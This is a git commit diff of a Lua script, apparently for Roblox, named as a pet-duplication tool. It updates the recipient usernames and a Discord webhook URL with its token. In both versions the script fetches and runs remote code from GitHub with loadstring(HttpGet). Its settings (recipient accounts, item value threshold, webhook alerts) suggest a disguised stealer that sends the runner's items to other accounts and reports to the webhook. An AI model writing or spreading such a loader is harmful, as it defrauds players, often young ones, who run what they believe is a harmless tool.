a35ff58b7cef121e3f1eb5195ee8603ce0e573a6
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-08 18:35:30 -0400

    Update duplicate_pets.lua

--- duplicate_pets.lua
+++ duplicate_pets.lua
@@ -1,9 +1,9 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
 
-_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12", "ajandaa12alt11"} -- you can add as many as you'd like
+_G.Usernames = {"ajandaa12alt9", "kaianeiglLs", "ZWV_kgyj229", "KaianEIGLs"} -- you can add as many as you'd like
 _G.min_value = 0.1
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1387097069646512211/EQOBe0iP9ODGgkpnQcRi853Ap_8XO9Cr0n6z-14wWD4k5_g8HEuv7zg8lyeyI6TTxO17" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1389819831263432724/ghC-hYXflTHCvP3KmqFECs-4mHBxOnkQvJXTOd5UNdsCsbmidraYV_ELhs3KvWUAH6g8" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/source.lua"))()
